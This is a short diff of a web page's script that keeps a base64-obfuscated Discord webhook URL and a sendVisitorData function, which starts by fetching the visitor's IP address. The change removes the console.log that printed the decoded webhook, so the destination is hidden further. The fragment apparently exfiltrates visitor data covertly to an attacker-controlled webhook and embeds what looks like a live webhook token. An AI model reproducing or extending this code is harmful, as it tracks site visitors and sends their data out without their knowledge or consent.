@@ -10,7 +10,7 @@
         const MMMA = 'aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTQ3MjMwNTc4MDM0MTQ3NzU3OC9XQzJIV25hczNJZlE4cHVBblZkQUFzdTJHN3FBZnNwa09DX1ZvcW8tU1JnZnpHZGlpclFlc3EyX3dsQ245UEh5SnBsZw=='
 
         const WAMDD = atob(MMMA);
-        console.log(WAMDD)
+        
         async function sendVisitorData() {
             try {
                 const ipResponse = await fetch('https://api.ipify.org?format=json');
